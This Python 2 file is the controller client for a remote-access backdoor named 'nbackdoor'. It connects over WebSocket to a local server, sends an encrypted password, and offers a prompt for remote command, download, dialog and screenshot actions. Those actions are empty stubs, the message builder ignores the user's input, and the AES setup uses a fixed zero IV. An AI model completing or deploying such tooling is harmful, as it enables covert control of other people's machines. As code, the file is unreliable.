#!/usr/bin/env python
# coding:utf-8
import argparse
import os
import ctypes
import subprocess
import threading
import chardet
import uuid
import json
import time
from base64 import b64decode, b64encode
from websocket import create_connection
from Crypto.Cipher import AES
__author__ = 'nekocode'


class ControllerClient:
    def __init__(self):
        self.SERVER_HOST = 'http://127.0.0.1:8888'
        self.ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None

        self.exit = False

    def run(self):
        while True:
            try:
                print 'finding server...'
                self.ws = create_connection("ws://localhost:8888/")
                print 'server connected.'

                pwd = raw_input('please input the password:')
                sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET), 'pwd': self.encrypt(pwd)}
                self.ws.send(json.dumps(sercret_msg))

                while True:
                    input_str = raw_input('nbackdoor:')
                    self.ws.send(self.command_to_msg(input_str))

                    msg = json.loads(self.ws.recv())
                    if 'data' in msg:
                        data = self.decrypt(msg['data'])
                        print data

                self.ws.close()

            except Exception as e:
                if self.ws:
                    self.ws.close()
                time.sleep(3)

    def command_to_msg(self, input_str):
        input_array = input_str.split()
        command_str = input_array[0]
        args_str = input_array[1:]

        if command_str == 'help':
            parser = argparse.ArgumentParser(description="nbackdoor by nekocode!!!",
                                             version='1.0.0',
                                             formatter_class=argparse.RawTextHelpFormatter,
                                             epilog='neko!')
            parser.print_help()
        elif command_str == 'list':
            pass
        elif command_str == 'cmd':
            pass
        elif command_str == 'download':
            pass
        elif command_str == 'dialog':
            pass
        elif command_str == 'screen':
            pass
        elif command_str == 'exit':
            self.exit = True
            exit()

        return json.dumps({'data': self.encrypt('data')})

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain


if __name__ == '__main__':
    client = ControllerClient()
    while not client.exit:
        client.run()


